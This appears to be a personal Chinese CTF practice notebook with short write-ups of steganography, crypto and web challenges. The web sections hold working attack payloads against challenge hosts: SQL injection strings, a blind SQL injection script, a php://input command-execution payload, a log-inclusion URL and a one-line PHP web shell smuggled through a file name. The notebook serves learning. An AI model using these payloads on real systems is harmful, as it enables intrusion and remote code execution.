from argparse import ArgumentParser
ALPHA = 5
def build_parser():
    parser = ArgumentParser()
    parser.add_argument('--original', dest='ori', required=True)
    parser.add_argument('--image', dest='img', required=True)
    parser.add_argument('--result', dest='res', required=True)
    parser.add_argument('--alpha', dest='alpha', default=ALPHA)
    return parser
def main():
    parser = build_parser()
    options = parser.parse_args()
    ori = options.ori
    img = options.img
    res = options.res
    alpha = options.alpha
    if not os.path.isfile(ori):
        parser.error("original image %s does not exist." % ori)
    if not os.path.isfile(img):
        parser.error("image %s does not exist." % img)
    decode(ori, img, res, alpha)
def decode(ori_path, img_path, res_path, alpha):
    ori = cv2.imread(ori_path)
    img = cv2.imread(img_path)
    ori_f = np.fft.fft2(ori)
    img_f = np.fft.fft2(img)
    height, width = ori.shape[0], ori.shape[1]
    watermark = (ori_f - img_f) / alpha
    watermark = np.real(watermark)
    res = np.zeros(watermark.shape)
    random.seed(height + width)
    x = range(height / 2)
    y = range(width)
    random.shuffle(x)
    random.shuffle(y)
    for i in range(height / 2):
        for j in range(width):
            res[x[i]][y[j]] = watermark[i][j]
    cv2.imwrite(res_path, res, [int(cv2.IMWRITE_JPEG_QUALITY), 100])
if __name__ == '__main__':
    main()
```
```plain
python2 1.py --original 1.png --image 2.png --result out.png
```
![图片](https://uploader.shimo.im/f/k5bydVycvwlTKz3b.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

cv2库安装

```plain
python2 -m pip install  opencv-python==4.2.0.32
```



## [UTCTF2020]File Carving

考察点:elf文件是linux下的可执行文件

png分离出一个压缩包，压缩包里存了一个elf文件，放在linux下执行即可

![图片](https://uploader.shimo.im/f/4umNowHtQapUcj56.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

## [GUET-CTF2019]soul sipse

![图片](https://uploader.shimo.im/f/xpkf5r0yItpyMi4n.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

```plain
steghide extract -sf out.wav
```
![图片](https://uploader.shimo.im/f/S4cpvQSToVJKt940.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

下载一张图片，文件头错误，修改文件头

![图片](https://uploader.shimo.im/f/QDJPVg6GIRSWcbrO.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

![图片](https://uploader.shimo.im/f/lku2Ae8hg6UhMwwa.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

```plain
\u0034\u0030\u0037\u0030\u000d\u000a\u0031\lu0032\u0033\u0034\u000d\u000a
```
![图片](https://uploader.shimo.im/f/4TWVzWS7H420LEW2.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

flag{5304}

## [UTCTF2020]spectogram

直接看频谱图

![图片](https://uploader.shimo.im/f/vIW9LBsB48QpcLij.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

```plain
flag{sp3tr0gr4m0ph0n3}
```
## [watevrCTF 2019]Evil Cuteness

png分离出一个压缩包，压缩包的文件打开就是flag

![图片](https://uploader.shimo.im/f/9NaDltDIKLheRacT.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)


## ctfshow web签到

![图片](https://uploader.shimo.im/f/gGYeApt78EbkOV3S.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

查看源代码解base64得到flag

## web2

![图片](https://uploader.shimo.im/f/SeSq6r9iGlLXoHJN.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

```plain
username=admin%27union select 1,group_concat(flag),3 from flag#&password=13
```
## web3

web3![图片](https://uploader.shimo.im/f/IWVypccpAqRJSJaq.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

```plain
get:?url=php://input
post:<?php system("ls");?>
```
![图片](https://uploader.shimo.im/f/IEkDiE4TENMNcf7i.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

## web4

```plain
http://bb25d0c9-7b8f-46b1-b9d5-d36d9c014417.challenge.ctf.show:8080/?url=/var/log/nginx/access.log
```

![图片](https://uploader.shimo.im/f/Emqp5ZfH0xXPGJId.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)


# 2021/4/25
## 蜘蛛侠呀

经过测试发现在每个

![图片](https://uploader.shimo.im/f/frayR4My7D3NnLGz.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

```plain
tshark -r out.pcap -T fields -e data > data.txt
```
![图片](https://uploader.shimo.im/f/GOxUDLWlFMtSMpVX.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

# 2021/4/26
一张图片改下文件头应该是jpg的图,末尾有一串不知道啥玩意，看了大佬的wp，知道是`Python Picke`序列化的数据 ，将数据提取出来,右击->选择->提取。

使用pick脚本load出来(大概是反序列化？)

```plain
import pickle  
fp = open("123.txt","rb+")
fw = open('pickle.txt', 'w')
a=pickle.load(fp)
pickle=str(a)
fw.write( pickle )
fw.close()
fp.close()
```
得到一堆坐标。

![图片](https://uploader.shimo.im/f/9Ldyz9v5WXf5QMjK.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

再用脚本转换

```plain
fw = open("pickle.txt","r")
text=fw.read( )
i=0
a=0

while i<len(text)+1:
    if(text[i]==']'):
       print('\n')
       a=0
    elif(text[i]=='('):
        if(text[i+2]==','):
            b=text[i+1]
            d=text[i+1]
            b=int(b)-int(a)
            c=1
            while c<b:
                print(" ", end="")
                c += 1
            print(text[i+5], end="")
            a=int(d)
        else:
            b=text[i+1]+text[i+2]
            d=text[i+1]+text[i+2]
            b=int(b)-int(a)
            c=1
            while c<b:
                print(" ", end="")
                c += 1
            print(text[i+6], end="")
            a=int(d)
    i +=1
```
## [INSHack2017]sanity

下载之后一个文档。

![图片](https://uploader.shimo.im/f/wzmebVYxY1MSabry.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

## [MRCTF2020]小O的考研复试

![图片](https://uploader.shimo.im/f/DpC3Jqa8eKZgCpf1.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

```plain
flag=0
for i in range(0,19260817):
flag = (flag*10+2)%1000000007
print(flag)
print('end:   ',flag)
```

```plain
flag{577302567}
```
## [INSHack2019]INSAnity

签到

![图片](https://uploader.shimo.im/f/EAfxyIR1IenqbvVO.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

## [INSHack2019]Sanity

![图片](https://uploader.shimo.im/f/EpEmkasECaY0B2O4.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)


# 2021/5/1
## [CISCN2019 总决赛 Day2 Web1]Easyweb

访问是一个登陆界面，访问robots.txt

![图片](https://uploader.shimo.im/f/QVLmbovYb58n62s9.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

我们尝试访问User.php.bak，500，访问image.php.bak，下载php文件

```plain
<?php
include "config.php";
$id=isset($_GET["id"])?$_GET["id"]:"1";
$path=isset($_GET["path"])?$_GET["path"]:"";
$id=addslashes($id);
函数返回在预定义字符之前添加反斜杠的字符串。预定义的字符有：单引号，双引号，反斜杠，NULL
$path=addslashes($path);
$id=str_replace(array("\\0","%00","\\'","'"),"",$id);
$path=str_replace(array("\\0","%00","\\'","'"),"",$path);
$result=mysqli_query($con,"select * from images where id='{$id}' or path='{$path}'");
$row=mysqli_fetch_array($result,MYSQLI_ASSOC);
$path="./" . $row["path"];
header("Content-Type: image/jpeg");
readfile($path);
```
盲注得到username和password
```plain
import requests
url = "http://04c4f002-4712-444e-bbb6-f690232960d3.node3.buuoj.cn/image.php"
result = ''
for i in range(0, 30):
right = 127
left = 32
mid = int((right + left) >> 1)
while right > left:
payload = " or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1))>%d,1,0)#" % (i, mid)
params = {
'id': '\\0',
'path': payload
}
response = requests.get(url, params=params)
if "JFIF" in response.text:
left = mid + 1
else:
right = mid
mid = int((right + left) >> 1)
result += chr(mid)
print(result)
```
登陆后进入一个文件上传界面，
```plain
上传一个shell发现他是对文件名过滤，如果文件名里出现php就会报错。
上传一个正常图片，然后告诉我把文件名记录在日志里。因为是把文件名保存到日志中，而且日志文件是php，所以直接利用文件名写shell，把文件名改成一句话木马。
PHP开启短标签即short_open_tag=on时，可以使用输出变量。我们抓包将文件名改为<?=$_GET['cmd']; ?>
```
![图片](https://uploader.shimo.im/f/ROAGNUtdssvL6QHn.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

根目录拿到flag

## 很好的色彩呃？

下载后是一张gif的图片,图片本身有留个不同的颜色，qq截图时按住crtl可以查看色道

![图片](https://uploader.shimo.im/f/85RrkwYrGvbW4RrO.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

```plain
#8B8B61
#8B8B61
#8B8B70
#8B8B6A
#8B8B65
#8B8B73
```
只有后两位不同，提取后两位转字符串即可
```plain
aapjes
```
## key不在这里

二维码扫码,是一个连接，访问下

```plain
https://cn.bing.com/search?q=key%E4%B8%8D%E5%9C%A8%E8%BF%99%E9%87%8C&m=10210897103375566531005253102975053545155505050521025256555254995410298561015151985150375568&qs=n&form=QBRE&sp=-1&sc=0-38&sk=&cvid=2CE15329C18147CBA4C1CA97C8E1BB8C
```
![图片](https://uploader.shimo.im/f/4eZ6iyj8QEONjLeF.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

可以看到url里藏了一堆ascii码,尝试转换

```plain
text='10210897103375566531005253102975053545155505050521025256555254995410298561015151985150375568'
flag=''
i = 0
while(i < len(text)):
    if(int(text[i:i+3]) < 127):
        flag +=chr(int(text[i:i+3]))
        i+=3
    else:
        flag +=chr(int(text[i:i+2]))
        i+=2
print(flag)
#flag{5d45fa256372224f48746c6fb8e33b32}
```
## [INSHack2018]Self Congratulation

图片的左上角有一块东西

![图片](https://uploader.shimo.im/f/4oNlWut4rs14SaBv.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

提取一下

```plain
00110001001
10010001100
11001101000
01101010011
01100011011
10011100000
```
![图片](https://uploader.shimo.im/f/UO8aoGf1UG2YWcrA.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

## [ACTF新生赛2020]frequency

word里隐藏字体,感觉是base但是解密后就卡住了

![图片](https://uploader.shimo.im/f/ZkFkcuc3CQHYh67X.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

看wp，在详细信息里还有一部分，合起来base解密,然后词频分析拿到flag

![图片](https://uploader.shimo.im/f/391vJEGHuU7YMFJU.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

词频分析:[http://www.aihanyu.org/cncorpus/CpsTongji.aspx](http://www.aihanyu.org/cncorpus/CpsTongji.aspx?fileGuid=H6gChgR9HdcCqkRq)

![图片](https://uploader.shimo.im/f/mzVy5rOZ5olNTyPD.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

```plain
flag{plokmijnuhbygvrdxeszwq}
```
## [MRCTF2020]摇滚DJ（建议大声播放

无线电

```plain
flag{r3ce1ved_4n_img}
```
## [SCTF2019]Ready_Player_One

![图片](https://uploader.shimo.im/f/rxWWqk7AZXvA3YWW.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

# 2021/5/2
## [INSHack2019]gflag

打开文件是G语言，使用在线网站解密

![图片](https://uploader.shimo.im/f/OXkUWXEjklOgU6tx.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

在线网站:[https://ncviewer.com/](https://ncviewer.com/?fileGuid=H6gChgR9HdcCqkRq)

![图片](https://uploader.shimo.im/f/7p7SbbWohyCdbUdR.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

```plain
flag{3d_pr1nt3d_fl49}
```
## [QCTF2018]X-man-Keyword

图片直接给了一个密码，通过stegsolve查看各个通道，发现每个色道的0通道都隐藏了信息，那肯定就是Lsb加密，使用lsb.py解密，目前库不行解密不出来得到

```plain
PVSF{vVckHejqBOVX9C1c13GFfkHJrjIQeMwf}
```
根据题目提示为
`Nihilist 密码`

26个英文字母为ABCDEFGHIJKLMNOPQRSTUVWXYZ

把关键字提前后为LOVEKFCABDGHIJMNPQRSTUWXYZ

在置换后的序列里可以发现对应关系P=Q，V=C，S=T，F=F。。。。。

使用脚本解密

```plain
import string
 
enc='PVSF{vVckHejqBOVX9C1c13GFfkHJrjIQeMwf}'
grid='LOVEKFC'+'ABDGHIJMNPQRSTUWXY'
flag=''
 
for i in enc:
    if i in string.ascii_lowercase:
        index=grid.lower().index(i)
        flag+=string.ascii_lowercase[index]
        continue
    if i in string.ascii_uppercase:
        index=grid.upper().index(i)
        flag+=string.ascii_uppercase[index]
        continue
    flag+=i
print flag
```
```plain
flag{cCgeLdnrIBCX9G1g13KFfeLNsnMRdOwf}
```
## [INSHack2017]hiding-in-plain-sight

foremost 分离之

```plain
flag{l337_h4xx0r5_c0mmun1c473_w17h_PNGs}
```
## [DDCTF2018]第四扩展FS

图片里藏了个压缩包，属性里有压缩包的密码

txt里有很多重复的数据，猜测为词频分析

```plain
# -*- coding: utf-8 -*-
from collections import Counter
 
f=open('file.txt','r')
f_read=f.read()
print Counter(f_read)
```
![图片](https://uploader.shimo.im/f/lhTQyiOdM4IVrwvr.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

```plain
flag{huanwe1sik4o!}
```
